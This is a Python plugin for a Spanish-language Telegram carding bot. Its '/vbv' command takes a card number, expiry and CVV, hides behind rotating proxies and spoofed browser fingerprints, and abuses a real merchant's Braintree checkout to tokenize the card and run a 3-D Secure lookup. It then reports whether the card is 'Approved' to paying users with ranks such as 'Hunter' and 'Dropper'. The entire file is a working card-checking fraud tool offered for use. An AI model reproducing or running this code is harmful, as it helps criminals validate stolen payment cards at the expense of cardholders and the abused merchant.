import time
import re
from parse import parseX
import requests
import names
import time
from Plugins.Func import connect_to_db
from random import *
from pyrogram import Client
from pyrogram import filters
import random
import time
import string
import json
import base64
from func_bin import get_bin_info
import random
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import uuid

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session

def find_between(data: str, first: str, last: str) -> str:
    # Busca una subcadena dentro de una cadena, dados dos marcadores
    if not isinstance(data, str):
        raise TypeError("El primer argumento debe ser una cadena de texto.")
    
    try:
        start_index = data.index(first) + len(first)
        end_index = data.index(last, start_index)
        return data[start_index:end_index]
    except ValueError:
        return ''
def get_random_string(length):
    # Genera una cadena de texto aleatoria.
    letters = string.ascii_letters + string.digits
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str


keyboard = InlineKeyboardMarkup(
    [
        [InlineKeyboardButton("ðð®ð²", url="https://t.me/")]
    ]
)
proxiess = "proxys.txt"
from Plugins.SegundoPlano.antispam import *

@Client.on_message(filters.command("vbv", prefixes=['.','/','!','$'], case_sensitive=False) & filters.text)
def Shopify(client, message):

        
        conn = connect_to_db()
        cursor = conn.cursor()
        
        userid = message.from_user.id
        command = "/vbv"
        spam_message = antispam(userid, command, message)
        reply = message.reply_to_message
        name = message.from_user.first_name
        usernames = message.from_user.username
        if spam_message is not None:
            message.reply(spam_message)
            return
        chat_id = message.chat.id
        
        conn = connect_to_db()
        cursor = conn.cursor()
        user_id = message.from_user.id
        username = message.from_user.username  
        
        cursor.execute('SELECT rango, creditos, antispam, dias FROM users WHERE user_id = ?', (user_id,))
        user_data = cursor.fetchone()
        if not user_data:
                    return message.reply(f"<b>Primero debes registrarte para usar este comando, usa /register</b> ")
                

        conn = connect_to_db()
        cursor = conn.cursor()
        user_id = message.from_user.id
        username = message.from_user.username  
        
        cursor.execute('SELECT rango, creditos, antispam, dias FROM users WHERE user_id = ?', (user_id,))
        user_data = cursor.fetchone()
        if not user_data:
                    return message.reply(f"<b>Primero debes registrarte para usar este comando, usa /register</b> ")
                
        if user_data[0] in ["Baneado", "baneado"]:
            return message.reply(f"<b>Estas Baneado del bot.âŒ. </b> ")
            
        chat_id2 = message.chat.id
        chat_data = cursor.execute('SELECT rango FROM users WHERE user_id = ?', (chat_id2,))
        chat_data = cursor.fetchone()
        
        if chat_data is None:
            chat_data = "Free"
            
            
            
        if all(role not in user_data[0] for role in ["Hunter", "Dropper", "Premium", "Seller", "Owner", "VIP","CoOwner"]) and all(role not in chat_data[0] for role in ["Grupo", "Staff"]):
                return message.reply(f"<b> <u>[âœ¶] Kazuki Warning â›…ï¸</u>\n- - - - - - - - - - - - - - - - - - - - - - - -\n <u>Command premium, acess denied!</u> ðŸ–ï¸</b>""")

        if user_data:
                rango = user_data[0] 
        if message.from_user is not None:
                username = getattr(message.from_user, 'username', None)
    
        ccs = message.text[len('/vbv '):]  
        
        x = get_bin_info(ccs[:6])
                        
        inicio = time.time()
        reply = message.reply_to_message
        
            
        if not ccs:
            if not reply or not reply.text:
                return message.reply(f"""<b> ð–€ð–’ð–‡ð–—ð–Šð–‘ð–‘ð–† ð•®ð–ð– â”Š Invalid Format âš ï¸
 - - - - - - - - - - - - - - - - - - - - - - - -
 <u>[<a href="https://t.me/">âœ¶</a>] <u>Comando</u> â”Š <code>Baintree vbv [/vbv]</code>
<u>[<a href="https://t.me/">âœ¶</a>] <u>Ejemplo</u> â”Š <code>/vbv cc|mes|aÃ±o|cvv</code>
<u>[<a href="https://t.me/">âœ¶</a>] <u>Pasarela</u> â”Š <code>Baintree vbv</code>
- - - - - - - - - - - - - - - - - - - - - - - -                                                                                            
</b>""")

            ccs_match = re.search(r"\d{16}[\s|:|::]\d{2}[\s|:|::]\d{4}[\s|:|::]\d{3}", reply.text)
            if not ccs_match:
                return message.reply(f"Agregue una tarjeta Valida.</a> ")
            ccs = ccs_match.group(0)
        
        ccs = ccs.replace(" ", "")

        #----- Extraer la informaciÃ³n de la tarjeta de crÃ©dito utilizando una expresiÃ³n regular
        expl = re.split(r"[\s:|]+", ccs)
        if len(expl) < 4:
            # La cadena no tiene suficientes elementos para ser una tarjeta de crÃ©dito vÃ¡lida
            return message.reply(f"INGRESE UNA TARJETA VALIDA")

        expl = re.findall(r'\d+', ccs)
        ccnum = expl[0]
        mes = expl[1]
        ano = expl[2]
        cvv = expl[3]      
        ccvip = f"{ccnum}|{mes}|{ano}|{cvv}"        
        bin_number = ccnum[:6]       


        if not x: return message.reply(text=f"<b>Ingresa Una Tarjeta Valida.</b> ",quote=True)

        if not re.match(r'^\d{15,16}$', ccnum):
            return message.reply(f"<b>CARD INVALIDA</b>")

        # Validar la fecha de expiraciÃ³n
        if not re.match(r'^\d{2}/\d{2}(\d{2})?$', f'{mes}/{ano}'):
            return message.reply(f"<b>FECHA INVALIDA</b>")

        # Validar el CVV
        if not re.match(r'^\d{3,4}$', cvv):
            return message.reply(f"<b>CVV INVALIDO")
        
        # Verificar si el bin estÃ¡ en la lista de bins prohibidos

                  
        keyboard = InlineKeyboardMarkup(
            [
                [   
                 InlineKeyboardButton(text='ðð®ð²',url='https://t.me/')
                ]
            ]
        )
        
        end = time.time()
        tiempo = str(inicio - end)[1:5]
        
        edite_message = message.reply (f"""<b><u>[<a href="https://t.me/">âœ¶</a>] Checking Card â›…ï¸</u>
- - - - - - - - - - - - - - - - - - - - - - - -
<u>[<a href="https://t.me/">âœ¶</a>] <u>Card</u> â”Š <code>{ccvip}</code>
<u>[<a href="https://t.me/">âœ¶</a>]  <u>Status</u> â”Š â– â–¡â–¡â–¡â–¡â–¡ 10% â¬œ
- - - - - - - - - - - - - - - - - - - - - - - -
<u>[<a href="https://t.me/">âœ¶</a>] <u>Gateway</u> â”Š <code>Baintree vbv</code>
<u>[<a href="https://t.me/">âœ¶</a>] <u>Time</u> â”Š <code>{tiempo}'s</code>
<u>[<a href="https://t.me/">âœ¶</a>] <u>Checked</u> â”Š @{username} <code>[{rango}]</code>
- - - - - - - - - - - - - - - - - - - - - - - -</b>""", reply_markup=keyboard)
        time.sleep(4)

        end = time.time()
        tiempo = str(inicio - end)[1:5]
        
        edite_message.edit_text(f"""<b><u>[<a href="https://t.me/">âœ¶</a>] Checking Card â›…ï¸</u>
- - - - - - - - - - - - - - - - - - - - - - - -
<u>[<a href="https://t.me/">âœ¶</a>] <u>Card</u> â”Š  <code>{ccvip}</code>
<u>[<a href="https://t.me/">âœ¶</a>] <u>Status</u> â”Š  â– â– â–¡â–¡â–¡â–¡ 30% â¬›
- - - - - - - - - - - - - - - - - - - - - - - -
<u>[<a href="https://t.me/">âœ¶</a>] <u>Gateway</u> â”Š  <code>Baintree vbv</code>
<u>[<a href="https://t.me/">âœ¶</a>] <u>Time</u> â”Š <code>{tiempo}'s</code>
<u>[<a href="https://t.me/">âœ¶</a>] <u>Checked</u> â”Š  @{username} <code>[{rango}]</code>
- - - - - - - - - - - - - - - - - - - - - - - -</b>""", reply_markup=keyboard)
        time.sleep(3)
        
        end = time.time()
        tiempo = str(inicio - end)[1:5]
        
        edite_message.edit_text(f"""<b><u>[<a href="https://t.me/">âœ¶</a>] Checking Card â›…ï¸</u>
- - - - - - - - - - - - - - - - - - - - - - - -
<u>[<a href="https://t.me/">âœ¶</a>] <u>Card</u>â”Š<code>{ccvip}</code>
<u>[<a href="https://t.me/">âœ¶</a>] <u>Status</u> â”Š  â– â– â– â–¡â–¡â–¡ 55% ðŸŸ¦
- - - - - - - - - - - - - - - - - - - - - - - -
<u>[<a href="https://t.me/">âœ¶</a>] <u>Gateway</u> â”Š  <code>Baintree vbv</code>
 <u>[<a href="https://t.me/">âœ¶</a>] <u>Time</u> â”Š  <code>{tiempo}'s</code>
<u>[<a href="https://t.me/">âœ¶</a>] <u>Checked</u> â”Š  @{username} <code>[{rango}]</code>
- - - - - - - - - - - - - - - - - - - - - - - -</b>""", reply_markup=keyboard)
        
        session = requests.Session()

        with open(proxiess, 'r') as file:
                    proxies_1 = file.read().splitlines()
            
                    proxie = random.choice(proxies_1)

                    proxies = {
        "http": proxie,
        "https": proxie
                    }
    
       
    

        req = requests.get(f"https://bins.antipublic.cc/bins/{ccnum[:6]}").json()      
        brand = req['brand'].lower()

        CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com" 
        SessionId = generar_codigo_session()

        #------------------- #1 Requests -------------------#
        headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                # 'Cookie': 'session=.eJw9zMEKgkAQANBfiTl3SNGL4EHYEIOZxdhcZi9CZq1TFlSQrPjvdep9wJuhHU6QzbA6QgY0NgMJjdoUCVtOtcWNkyrGUExUNoLmEliqlOIqh2UN3et5bt-Pa3__F2g5QbX9uBGDU3WkS55Idl6rIrhy70kdIm28sKUbqi5m8V7X-a9bvhV1LKY.GFdQvg.dUPWNR3udUKjlybPfSTATWNNmT4; _gcl_au=1.1.2119804998.1702215486; _clck=19o4wld%7C2%7Cfhf%7C0%7C1439; _ga=GA1.2.2076091999.1702215486; _gid=GA1.2.1591466729.1702215486; _gat=1; _ga_1PG4T8TWPN=GS1.2.1702215486.1.0.1702215486.0.0.0',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
                'sec-ch-ua': '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }
        

        response = session.get('https://www.masteringemacs.org/order',  headers=headers).text
        lines = response.split("\n")
        for i in lines:
                                if "        data-client-token=" in i:
                                    sucio = i
        bearer = sucio.replace('        data-client-token="',"").replace('"',"")
        bearer = json.loads(base64.b64decode(bearer))
        bearer = bearer['authorizationFingerprint']
            
        end = time.time()
        tiempo = str(inicio - end)[1:5]
            
        edite_message.edit_text(f"""<b><u>[<a href="https://t.me/">âœ¶</a>] Checking Card â›…ï¸</u>
- - - - - - - - - - - - - - - - - - - - - - - -
<u>[<a href="https://t.me/">âœ¶</a>] <u>Card</u> â”Š  <code>{ccvip}</code>
<u>[<a href="https://t.me/">âœ¶</a>] <u>Status</u> â”Š  â– â– â– â– â–¡â–¡ 70% ðŸŸ¥
- - - - - - - - - - - - - - - - - - - - - - - -
<u>[<a href="https://t.me/">âœ¶</a>] <u>Gateway</u> â”Š  <code>Baintree vbv</code>
<u>[<a href="https://t.me/">âœ¶</a>] <u>Time</u> â”Š  <code>{tiempo}'s</code>
<u>[<a href="https://t.me/">âœ¶</a>] <u>Checked</u> â”Š  @{username} <code>[{rango}]</code>
- - - - - - - - - - - - - - - - - - - - - - - -</b>
""", reply_markup=keyboard)
            
            
        #------------------- #2 Requests -------------------#
        
        headers = {
                'authority': 'payments.braintree-api.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': f'Bearer {bearer}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://www.masteringemacs.org',
                'referer': 'https://www.masteringemacs.org/',
                'sec-ch-ua': '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
            }

        json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': SessionId,
                },
                'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
                'operationName': 'ClientConfiguration',
            }


                
        response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()
        merchanid = response['data']['clientConfiguration']['merchantId']
        jwt = response['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']

        #------------------- #3 Requests -------------------#   
        
        headers = {
                'authority': 'centinelapi.cardinalcommerce.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json;charset=UTF-8',
                'origin': 'https://www.masteringemacs.org',
                'referer': 'https://www.masteringemacs.org/',
                'sec-ch-ua': '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
                'x-cardinal-tid': 'Tid-96cddccc-81bb-4b4e-9953-a5845e56e725',
            }

        json_data = {
                'BrowserPayload': {
                    'Order': {
                        'OrderDetails': {},
                        'Consumer': {
                            'BillingAddress': {},
                            'ShippingAddress': {},
                            'Account': {},
                        },
                        'Cart': [],
                        'Token': {},
                        'Authorization': {},
                        'Options': {},
                        'CCAExtension': {},
                    },
                    'SupportsAlternativePayments': {
                        'cca': True,
                        'hostedFields': False,
                        'applepay': False,
                        'discoverwallet': False,
                        'wallet': False,
                        'paypal': False,
                        'visacheckout': False,
                    },
                },
                'Client': {
                    'Agent': 'SongbirdJS',
                    'Version': '1.35.0',
                },
                'ConsumerSessionId': None,
                'ServerJWT': jwt,
            }

        response = session.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data).text
        bearer2 = parseX(response, '{"CardinalJWT":"', '"}')
        partes = bearer2.split('.')
        payload_codificado = partes[1]

                # Decodificar la parte base64
        payload_decodificado = base64.urlsafe_b64decode(payload_codificado + '=' * (4 - len(payload_codificado) % 4))

                # Cargar el payload decodificado como un diccionario JSON
        decode1 = json.loads(payload_decodificado)
                
        ideference = decode1['ReferenceId']    
        #------------------- #4 Requests -------------------#
        
        headers = {
                'authority': 'geo.cardinalcommerce.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                # 'cookie': '__cfruid=55f9807edacfc3b711e26a2dcfcd2cbe65737ab3-1702215489',
                'origin': 'https://geo.cardinalcommerce.com',
                'referer': f'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5c8ab288adb1562e003d3637&tmEventType=PAYMENT&referenceId={ideference}&geolocation=false&origin=Songbird',
                'sec-ch-ua': '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
                'x-requested-with': 'XMLHttpRequest',
            }

        json_data = {
                'Cookies': {
                    'Legacy': True,
                    'LocalStorage': True,
                    'SessionStorage': True,
                },
                'DeviceChannel': 'Browser',
                'Extended': {
                    'Browser': {
                        'Adblock': True,
                        'AvailableJsFonts': [],
                        'DoNotTrack': 'unknown',
                        'JavaEnabled': False,
                    },
                    'Device': {
                        'ColorDepth': 24,
                        'Cpu': 'unknown',
                        'Platform': 'Win32',
                        'TouchSupport': {
                            'MaxTouchPoints': 0,
                            'OnTouchStartAvailable': False,
                            'TouchEventCreationSuccessful': False,
                        },
                    },
                },
                'Fingerprint': 'f9f30df37936982a8fe6d275f3e98441',
                'FingerprintingTime': 780,
                'FingerprintDetails': {
                    'Version': '1.5.1',
                },
                'Language': 'en-US',
                'Latitude': None,
                'Longitude': None,
                'OrgUnitId': '5c8ab288adb1562e003d3637',
                'Origin': 'Songbird',
                'Plugin': [
                    'PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                    'Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                    'Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                    'Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                    'WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                ],
                'ReferenceId': ideference,
                'Referrer': 'https://www.masteringemacs.org/',
                'Screen': {
                    'FakedResolution': False,
                    'Ratio': 1.7786458333333333,
                    'Resolution': '1366x768',
                    'UsableResolution': '1366x728',
                    'CCAScreenSize': '02',
                },
                'CallSignEnabled': None,
                'ThreatMetrixEnabled': False,
                'ThreatMetrixEventType': 'PAYMENT',
                'ThreatMetrixAlias': 'Default',
                'TimeOffset': 300,
                'UserAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
                'UserAgentDetails': {
                    'FakedOS': False,
                    'FakedBrowser': False,
                },
                'BinSessionId': 'ce6b2cde-c82c-4291-9015-031e25b8c30a',
            }

            

        response = session.post(
                    'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
                    headers=headers,
                    json=json_data,
                )
                

            
        #------------------- #5 Requests -------------------#
        
        headers = {
                'authority': 'payments.braintree-api.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': f'Bearer {bearer}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
            }

        json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'dropin2',
                    'sessionId': SessionId,
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': ccnum,
                            'expirationMonth': mes,
                            'expirationYear': ano,
                            'cvv': cvv,
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }



        response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()
        tokencc = response['data']['tokenizeCreditCard']['token']
            


        #------------------- #6 Requests -------------------#
        
        headers = {
                'authority': 'api.braintreegateway.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://www.masteringemacs.org',
                'referer': 'https://www.masteringemacs.org/',
                'sec-ch-ua': '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
            }

        json_data = {
                'amount': '39.75',
                'additionalInfo': {
                    'acsWindowSize': '03',
                },
                'bin': ccnum[:6],
                'dfReferenceId': ideference,
                'clientMetadata': {
                    'requestedThreeDSecureVersion': '2',
                    'sdkVersion': 'web/3.85.2',
                    'cardinalDeviceDataCollectionTimeElapsed': 236,
                    'issuerDeviceDataCollectionTimeElapsed': 3628,
                    'issuerDeviceDataCollectionResult': True,
                },
                'authorizationFingerprint': bearer,
                'braintreeLibraryVersion': 'braintree/web/3.85.2',
                '_meta': {
                    'merchantAppId': 'www.masteringemacs.org',
                    'platform': 'web',
                    'sdkVersion': '3.85.2',
                    'source': 'client',
                    'integration': 'custom',
                    'integrationType': 'custom',
                    'sessionId': SessionId,
                },
            }

            

        response = session.post(
                    f'https://api.braintreegateway.com/merchants/{merchanid}/client_api/v1/payment_methods/{tokencc}/three_d_secure/lookup',
                    headers=headers,
                    json=json_data,
                ).json()
        code = response['paymentMethod']['threeDSecureInfo']['status']

            

            
        #------------------- RESPONSE CODE ------------------------#
        
        if "authenticate_successful" in code:
                msg = "Approved!  âœ…"
                respuesta = code
                
        elif "authenticate_attempt_successful" in code:
                msg = "Approved! âœ…"
                respuesta = code
                
        else:
                msg = "Declined! âŒ"
                respuesta = code
                
                
        time.sleep(8)


        edite_message.edit_text(f"""<b><u>[âœ¶] Checking Card â›…ï¸</u>
- - - - - - - - - - - - - - - - - - - - - - - -
<u>[<a href="https://t.me/">âœ¶</a>] <u>Card</u> â”Š <code>{ccvip}</code>
<u>[<a href="https://t.me/">âœ¶</a>] <u>Status</u> â”Š â– â– â– â– â– â–  100% âœ…
- - - - - - - - - - - - - - - - - - - - - - - -
<u>[<a href="https://t.me/">âœ¶</a>] <u>Gateway</u> â”Š<code>Baintree vbv</code>                       <u>[<a href="https://t.me/">âœ¶</a>] <u>Time</u> â”Š  <code>{tiempo}'s</code>
<u>[<a href="https://t.me/">âœ¶</a>] <u>Checked</u> â”Š  @{username} <code>[{rango}]</code></b>""", reply_markup=keyboard)
        time.sleep(5)

            
        keyboard = InlineKeyboardMarkup(
                [
                    [   
                    InlineKeyboardButton(text='ðð®ð²',url='https://t.me/')
                    ]
                ]
            )
            
        edite_message.edit_text(f"""<b><u>[<a href="https://t.me/">âœ¶</a>] chk ð†ðšð­ðžð°ðšð² â”Š ðð«ðšð¢ð§ð­ð«ðžðž ð•ðð•                
- - - - - - - - - - - - - - - - - - - - - - - -                                                   
<u>[<a href="https://t.me/">âœ¶</a>] <u>Card</u> â”Š <code>{ccvip}</code>
<u>[<a href="https://t.me/">âœ¶</a>] <u>Status</u> â”Š <code>{msg}</code>
<u>[<a href="https://t.me/">âœ¶</a>] <u>Response</u> â”Š <code>{respuesta}</code>
<u>[<a href="https://t.me/">âœ¶</a>] <u>Gateway</u> â”Š <code>Baintree VBV</code>
- - - - - - - - - - - - - - - - - - - - - - - -
<u>[<a href="https://t.me/">âœ¶</a>] <u>Bank</u> â”Š  <code>{x.get("bank_name")}</code>
<u>[<a href="https://t.me/">âœ¶</a>] <u>Data</u> â”Š  <code>{x.get("type")}</code> - <code>{x.get("level")}</code> - <code>{x.get("vendor")}</code>
<u>[<a href="https://t.me/">âœ¶</a>] <u>Country</u> â”Š  <code>{x.get("country")} {x.get("flag")}</code>
- - - - - - - - - - - - - - - - - - - - - - - -
<u>[<a href="https://t.me/">âœ¶</a>] <u>Time</u>â”Š<code>{tiempo}'s</code> 
<u>[<a href="https://t.me/">âœ¶</a>] <u>Proxys</u> <code>Live âœ…</code>
<u>[<a href="https://t.me/">âœ¶</a>] <u>Checked</u> â”Š @{username} <code>[{rango}]</code></b>""", reply_markup=keyboard)
        return

